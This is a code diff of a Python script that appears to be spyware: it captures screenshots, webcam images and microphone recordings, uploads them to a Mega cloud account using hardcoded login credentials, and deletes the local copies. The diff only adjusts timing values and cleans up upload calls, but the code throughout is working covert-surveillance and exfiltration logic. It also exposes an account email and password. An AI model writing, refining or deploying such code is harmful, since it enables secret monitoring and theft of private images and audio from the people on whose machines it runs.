@@ -24,9 +24,6 @@ except ModuleNotFoundError:
     modules_to_install = ["mega.py", "opencv-python", "pillow"]
     install_modules(modules_to_install)
 
-# time b/w screenshots
-screenshot_interval = 1
-
 # Set your Mega credentials
 mega_email = 'lajex92681@meidecn.com'
 mega_password = 'b@sit1218'
@@ -79,6 +76,9 @@ try:
 except:
     pass
 
+# time b/w screenshots
+screenshot_interval = 2
+
 def screenshot_webcam():
     try:
         global counter
@@ -92,7 +92,7 @@ def screenshot_webcam():
 
         print("uploading to screenshots")
         # Upload to Mega
-        mega_file = mega_login.upload(filename, screenshots_folder)
+        mega_login.upload(filename, screenshots_folder)
 
         # Delete the screenshot 
         os.remove(filename)
@@ -114,7 +114,7 @@ def screenshot_webcam():
 
                 # upload webcam picture
                 print("uploading to webcam") 
-                mega_webcam_file = mega_login.upload(webcam_filename, webcam_folder)
+                mega_login.upload(webcam_filename, webcam_folder)
 
                 # Delete the webcam picture 
                 os.remove(webcam_filename)
@@ -130,7 +130,7 @@ def record_audio():
     try:
         current_time = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
         recording_file_name = f'recording_{username}_{current_time}.wav'
-        duration = 60
+        duration = 10
         CHUNK = 1024
         FORMAT = pyaudio.paInt16
         CHANNELS = 1
@@ -165,7 +165,7 @@ def record_audio():
 
         print(f"uploading audio {recording_file_name}")
 
-        mega_file = mega_login.upload(recording_file_name, recordings_folder)
+        mega_login.upload(recording_file_name, recordings_folder)
 
         os.remove(recording_file_name)
 
